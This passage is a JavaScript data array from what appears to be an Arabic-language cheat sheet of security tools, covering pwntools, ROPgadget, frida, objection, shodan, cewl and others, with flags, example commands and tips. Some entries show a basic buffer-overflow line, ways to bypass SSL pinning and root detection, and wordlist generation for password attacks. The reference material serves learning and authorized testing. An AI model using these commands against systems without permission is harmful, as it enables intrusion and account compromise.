    tips: 'ابحث عن open() وread() لمعرفة الملفات التي يقرأها البرنامج.',
    related: ['ltrace', 'gdb', 'ptrace']
  },
  {
    id: 1417,
    name: 'pwntools',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'python3 exploit.py',
    short: 'مكتبة Python لكتابة exploits',
    desc: 'إطار Python لكتابة exploits يدعم pwn, shellcode generation, ROP chains, وformat strings.',
    options: [],
    examples: [
      { cmd: 'from pwn import *; p = process("./binary"); p.sendline(b"A"*64)', desc: 'Buffer overflow أساسي' },
      { cmd: 'from pwn import *; r = remote("target", 4444)', desc: 'الاتصال بـ remote service' }
    ],
    tips: 'pwntools هو المعيار الذهبي لحل تحديات Binary Exploitation في CTF.',
    related: ['gdb', 'radare2', 'ROPgadget']
  },
  {
    id: 1418,
    name: 'ROPgadget',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'ROPgadget --binary <file>',
    short: 'البحث عن ROP gadgets في الملفات الثنائية',
    desc: 'أداة للبحث عن Return-Oriented Programming gadgets لبناء ROP chains لتجاوز DEP/NX.',
    options: [
      { flag: '--binary <file>', desc: 'الملف الثنائي' },
      { flag: '--rop', desc: 'البحث عن ROP gadgets' },
      { flag: '--string <str>', desc: 'البحث عن نص محدد' },
      { flag: '--badbytes <bytes>', desc: 'استبعاد bytes سيئة' }
    ],
    examples: [
      { cmd: 'ROPgadget --binary ./vuln', desc: 'البحث عن gadgets' },
      { cmd: 'ROPgadget --binary ./vuln --string "/bin/sh"', desc: 'البحث عن /bin/sh' }
    ],
    tips: 'ابحث دائماً عن "pop rdi; ret" لتمرير arguments في 64-bit.',
    related: ['pwntools', 'gdb', 'checksec']
  },
  {
    id: 1419,
    name: 'checksec',
    cat: 'exploit',
    level: 'intermediate',
    syntax: 'checksec --file=<binary>',
    short: 'فحص حمايات الملفات الثنائية',
    desc: 'يفحص الحمايات الأمنية المطبقة على ملف ثنائي مثل NX, PIE, Canary, RELRO.',
    options: [
      { flag: '--file=<file>', desc: 'الملف الثنائي' },
      { flag: '--proc=<pid>', desc: 'عملية جارية' }
    ],
    examples: [
      { cmd: 'checksec --file=./binary', desc: 'فحص حمايات ملف' },
      { cmd: 'checksec --proc=1234', desc: 'فحص عملية جارية' }
    ],
    tips: 'الهدف مع PIE وCanary وFull RELRO هو الأصعب في استغلاله.',
    related: ['pwntools', 'ROPgadget', 'gdb']
  },
  {
    id: 1420,
    name: 'gdb-pwndbg',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'gdb ./binary',
    short: 'GDB مع إضافة pwndbg للـ binary exploitation',
    desc: 'GDB مع إضافة pwndbg أو peda لتسهيل تحليل البرامج الثنائية واستغلال الثغرات.',
    options: [
      { flag: 'run', desc: 'تشغيل البرنامج' },
      { flag: 'break *<addr>', desc: 'وضع breakpoint' },
      { flag: 'x/<n><f> <addr>', desc: 'فحص الذاكرة' },
      { flag: 'info registers', desc: 'عرض السجلات' }
    ],
    examples: [
      { cmd: 'gdb ./binary', desc: 'فتح gdb' },
      { cmd: 'cyclic 100', desc: 'توليد pattern لإيجاد offset (pwndbg)' }
    ],
    tips: 'استخدم cyclic في pwndbg لإيجاد offset التحكم في RIP/EIP بسرعة.',
    related: ['pwntools', 'radare2', 'checksec']
  },
  {
    id: 1421,
    name: 'apktool',
    cat: 'reverse-engineering',
    level: 'intermediate',
    syntax: 'apktool [d|b] <apk>',
    short: 'تفكيك وإعادة بناء تطبيقات Android APK',
    desc: 'أداة لتفكيك تطبيقات Android APK وقراءة الكود ثم إعادة بنائها.',
    options: [
      { flag: 'd <apk>', desc: 'تفكيك APK' },
      { flag: 'b <dir>', desc: 'إعادة بناء APK' },
      { flag: '-s', desc: 'بدون تفكيك الـ sources' }
    ],
    examples: [
      { cmd: 'apktool d app.apk', desc: 'تفكيك التطبيق' },
      { cmd: 'apktool b app_decompiled/', desc: 'إعادة بناء التطبيق' }
    ],
    tips: 'بعد التفكيك، ابحث في smali/ عن hardcoded secrets.',
    related: ['jadx', 'dex2jar', 'androguard']
  },
  {
    id: 1422,
    name: 'jadx',
    cat: 'reverse-engineering',
    level: 'intermediate',
    syntax: 'jadx [options] <apk/dex>',
    short: 'تحويل DEX إلى Java للتطبيقات Android',
    desc: 'أداة لتفكيك تطبيقات Android وتحويل bytecode DEX إلى كود Java قابل للقراءة.',
    options: [
      { flag: '-d <dir>', desc: 'مجلد الإخراج' },
      { flag: '-j <threads>', desc: 'عدد الخيوط' }
    ],
    examples: [
      { cmd: 'jadx app.apk', desc: 'تفكيك APK إلى Java' },
      { cmd: 'jadx-gui app.apk', desc: 'فتح واجهة رسومية' }
    ],
    tips: 'jadx-gui أسهل للتصفح مع ميزة البحث عن نص.',
    related: ['apktool', 'dex2jar', 'MobSF']
  },
  {
    id: 1423,
    name: 'MobSF',
    cat: 'reverse-engineering',
    level: 'intermediate',
    syntax: 'mobsf',
    short: 'إطار أمان التطبيقات المحمولة',
    desc: 'Mobile Security Framework - إطار شامل لتحليل أمان تطبيقات Android و iOS.',
    options: [],
    examples: [
      { cmd: 'mobsf', desc: 'تشغيل MobSF' },
      { cmd: 'docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf', desc: 'تشغيل بـ Docker' }
    ],
    tips: 'MobSF يوفر تحليلاً ثابتاً وديناميكياً في واجهة ويب واحدة.',
    related: ['apktool', 'jadx', 'frida']
  },
  {
    id: 1424,
    name: 'frida',
    cat: 'reverse-engineering',
    level: 'advanced',
    syntax: 'frida [options] <target>',
    short: 'أداة dynamic instrumentation للتطبيقات',
    desc: 'إطار dynamic instrumentation يتيح حقن JavaScript في التطبيقات لتحليلها وتعديل سلوكها.',
    options: [
      { flag: '-U', desc: 'الاتصال بجهاز USB' },
      { flag: '-n <name>', desc: 'هدف باسم العملية' },
      { flag: '-l <script>', desc: 'تحميل سكريبت JavaScript' }
    ],
    examples: [
      { cmd: 'frida -U -n com.app.target -l hook.js', desc: 'حقن سكريبت في تطبيق Android' },
      { cmd: 'frida-ps -U', desc: 'سرد العمليات على الجهاز' }
    ],
    tips: 'frida مفيد لتجاوز SSL pinning وroot detection في تطبيقات Android.',
    related: ['objection', 'apktool', 'jadx']
  },
  {
    id: 1425,
    name: 'objection',
    cat: 'reverse-engineering',
    level: 'advanced',
    syntax: 'objection -g <app> explore',
    short: 'اختبار تطبيقات الهاتف بدون jailbreak/root',
    desc: 'أداة مبنية على Frida لاختبار تطبيقات Android وiOS تدعم تجاوز SSL pinning وroot detection.',
    options: [],
    examples: [
      { cmd: 'objection -g com.app.target explore', desc: 'فتح جلسة objection' },
      { cmd: 'android sslpinning disable', desc: 'تعطيل SSL pinning (داخل objection)' }
    ],
    tips: 'objection أسهل من frida للمهام الشائعة في Mobile pentesting.',
    related: ['frida', 'MobSF', 'burpsuite']
  },
  {
    id: 1426,
    name: 'maltego',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'maltego',
    short: 'استطلاع OSINT بصري وتحليل العلاقات',
    desc: 'أداة OSINT رسومية تجمع وتحلل وتعرض العلاقات بين الأشخاص والمؤسسات والبنى التحتية.',
    options: [],
    examples: [
      { cmd: 'maltego', desc: 'تشغيل واجهة Maltego' }
    ],
    tips: 'Maltego ممتاز لتمثيل العلاقات بصرياً في OSINT investigations.',
    related: ['theHarvester', 'recon-ng', 'osint-framework']
  },
  {
    id: 1427,
    name: 'recon-ng',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'recon-ng',
    short: 'إطار استطلاع OSINT تفاعلي',
    desc: 'إطار استطلاع مكتوب بـ Python مشابه لـ Metasploit لتجميع معلومات OSINT بشكل منهجي.',
    options: [],
    examples: [
      { cmd: 'recon-ng', desc: 'تشغيل إطار recon-ng' },
      { cmd: 'modules install all', desc: 'تثبيت كل الوحدات' }
    ],
    tips: 'استخدم marketplace install لتثبيت modules محددة.',
    related: ['maltego', 'theHarvester', 'amass']
  },
  {
    id: 1428,
    name: 'shodan',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'shodan [command] [options]',
    short: 'واجهة سطر أوامر لـ Shodan',
    desc: 'CLI لـ Shodan - محرك البحث للأجهزة المتصلة بالإنترنت، يكشف المنافذ والخدمات وثغرات الأجهزة.',
    options: [
      { flag: 'search <query>', desc: 'البحث في Shodan' },
      { flag: 'host <ip>', desc: 'معلومات IP محدد' },
      { flag: 'count <query>', desc: 'عدد النتائج' }
    ],
    examples: [
      { cmd: 'shodan search "apache 2.4"', desc: 'البحث عن خوادم Apache' },
      { cmd: 'shodan host 8.8.8.8', desc: 'معلومات IP محدد' },
      { cmd: 'shodan search "port:22 country:SA"', desc: 'خوادم SSH في المملكة العربية السعودية' }
    ],
    tips: 'shodan search filters: country, city, os, port, org.',
    related: ['censys', 'theHarvester', 'amass']
  },
  {
    id: 1429,
    name: 'censys',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'censys search <query>',
    short: 'بحث في فهرس الإنترنت Censys',
    desc: 'أداة CLI للبحث في قاعدة بيانات Censys لاكتشاف الأجهزة والخدمات المكشوفة على الإنترنت.',
    options: [],
    examples: [
      { cmd: 'censys search "services.port:8080"', desc: 'البحث عن خوادم على 8080' },
      { cmd: 'censys view hosts 8.8.8.8', desc: 'معلومات مضيف محدد' }
    ],
    tips: 'Censys يوفر بيانات TLS certificates مفيدة لاكتشاف النطاقات الفرعية.',
    related: ['shodan', 'amass', 'subfinder']
  },
  {
    id: 1430,
    name: 'cewl',
    cat: 'password',
    level: 'intermediate',
    syntax: 'cewl [options] <url>',
    short: 'توليد قوائم كلمات من مواقع الويب',
    desc: 'تزحف على موقع ويب وتستخرج الكلمات لإنشاء قائمة كلمات مخصصة لهجمات كلمات المرور.',
    options: [
      { flag: '-d <depth>', desc: 'عمق الزحف' },
      { flag: '-m <length>', desc: 'الحد الأدنى لطول الكلمة' },
      { flag: '-w <file>', desc: 'ملف الإخراج' },
      { flag: '-e', desc: 'استخراج عناوين البريد الإلكتروني' }
    ],
    examples: [
      { cmd: 'cewl http://target.com -w wordlist.txt', desc: 'توليد قائمة كلمات' },
      { cmd: 'cewl -d 3 -m 6 http://target.com -w custom.txt', desc: 'قائمة مخصصة بحد أدنى 6 حروف' }
    ],
    tips: 'قوائم CeWL مخصصة للهدف وأفضل من rockyou في بعض الحالات.',
    related: ['hydra', 'john', 'crunch']
  }
];
